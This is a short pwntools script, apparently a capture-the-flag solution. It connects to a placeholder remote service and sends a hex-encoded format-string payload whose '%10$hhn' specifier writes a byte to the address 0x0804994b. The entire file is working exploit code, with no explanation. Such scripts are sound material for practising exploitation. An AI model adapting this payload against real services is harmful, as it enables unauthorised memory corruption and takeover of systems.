g_local = True

from pwn import *
sh=remote("xxx", 1234)
sh.recvuntil("\n")
sh.send("\x31\x31\x33\x34\x35\x31\x39\x31\x31\x25\x31\x30\x24\x68\x68\x6E\x4B\x99\x04\x08")
print sh.recv()